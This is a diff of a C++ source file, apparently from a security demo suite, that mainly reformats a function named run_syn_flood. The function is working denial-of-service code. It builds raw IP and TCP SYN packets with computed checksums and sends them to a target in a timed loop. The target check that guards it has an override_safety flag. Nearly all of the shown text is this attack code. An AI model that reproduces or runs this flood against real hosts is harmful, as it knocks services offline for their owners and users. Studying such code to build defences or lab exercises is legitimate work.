@@ -1,15 +1,15 @@
+#include "../util/fd.h"
 #include "demos.h"
+#include <arpa/inet.h>
+#include <chrono>
+#include <cstring>
 #include <iostream>
-#include <sys/socket.h>
 #include <netinet/in.h>
 #include <netinet/ip.h>
 #include <netinet/tcp.h>
-#include <arpa/inet.h>
-#include <unistd.h>
-#include <chrono>
+#include <sys/socket.h>
 #include <thread>
-#include <cstring>
-#include "../util/fd.h"
+#include <unistd.h>
 
 namespace demo {
 
@@ -33,19 +33,20 @@ static uint16_t csum(unsigned short *ptr, int nbytes) {
     }
     if (nbytes == 1) {
         oddbyte = 0;
-        *((u_char*)&oddbyte) = *(u_char*)ptr;
+        *((u_char *)&oddbyte) = *(u_char *)ptr;
         sum += oddbyte;
     }
 
     sum = (sum >> 16) + (sum & 0xffff);
     sum = sum + (sum >> 16);
     answer = (short)~sum;
-    return (answer);
+    return static_cast<uint16_t>(answer);
 }
 
-util::Result<void> run_syn_flood(const DemoConfig& cfg) {
+util::Result<void> run_syn_flood(const DemoConfig &cfg) {
     auto valid = validate_target(cfg.target_ip, cfg.override_safety);
-    if (!valid.is_ok()) return valid;
+    if (!valid.is_ok())
+        return valid;
 
     util::UniqueFd sock(socket(AF_INET, SOCK_RAW, IPPROTO_TCP));
     if (!sock.is_valid()) {
@@ -64,8 +65,8 @@ util::Result<void> run_syn_flood(const DemoConfig& cfg) {
     inet_pton(AF_INET, cfg.target_ip.c_str(), &dest.sin_addr);
 
     char datagram[4096];
-    struct iphdr *iph = (struct iphdr *) datagram;
-    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof(struct iphdr));
+    struct iphdr *iph = (struct iphdr *)datagram;
+    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));
     struct pseudo_header psh;
 
     auto start = std::chrono::steady_clock::now();
@@ -75,7 +76,8 @@ util::Result<void> run_syn_flood(const DemoConfig& cfg) {
 
     while (true) {
         auto now = std::chrono::steady_clock::now();
-        if (std::chrono::duration_cast<std::chrono::seconds>(now - start).count() >= cfg.duration_s) {
+        if (std::chrono::duration_cast<std::chrono::seconds>(now - start).count() >=
+            cfg.duration_s) {
             break;
         }
 
@@ -92,25 +94,26 @@ util::Result<void> run_syn_flood(const DemoConfig& cfg) {
         iph->ttl = 255;
         iph->protocol = IPPROTO_TCP;
         iph->check = 0;
-        iph->saddr = inet_addr("127.0.0.1"); 
+        iph->saddr = inet_addr("127.0.0.1");
         iph->daddr = dest.sin_addr.s_addr;
         // Fix: IP checksum only over IP header (20 bytes)
-        iph->check = csum((unsigned short *) datagram, sizeof(struct iphdr));
+        iph->check = csum((unsigned short *)datagram, sizeof(struct iphdr));
 
         // TCP Header
         tcph->source = htons(sport_base++);
-        if (sport_base == 0) sport_base = 1024;
+        if (sport_base == 0)
+            sport_base = 1024;
         tcph->dest = htons(cfg.target_port);
         tcph->seq = 0;
         tcph->ack_seq = 0;
-        tcph->doff = 5; 
+        tcph->doff = 5;
         tcph->fin = 0;
         tcph->syn = 1;
         tcph->rst = 0;
         tcph->psh = 0;
         tcph->ack = 0;
         tcph->urg = 0;
-        tcph->window = htons(5840); 
+        tcph->window = htons(5840);
         tcph->check = 0;
         tcph->urg_ptr = 0;
 
@@ -122,13 +125,14 @@ util::Result<void> run_syn_flood(const DemoConfig& cfg) {
         psh.tcp_length = htons(sizeof(struct tcphdr));
 
         int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
-        char pseudogram[512]; 
-        memcpy(pseudogram, (char*) &psh, sizeof(struct pseudo_header));
+        char pseudogram[512];
+        memcpy(pseudogram, (char *)&psh, sizeof(struct pseudo_header));
         memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));
 
-        tcph->check = csum((unsigned short*) pseudogram, psize);
+        tcph->check = csum((unsigned short *)pseudogram, psize);
 
-        if (sendto(sock, datagram, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *) &dest, sizeof(dest)) < 0) {
+        if (sendto(sock, datagram, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
+                   (struct sockaddr *)&dest, sizeof(dest)) < 0) {
             return util::Result<void>::Err("sendto failed");
         }
 
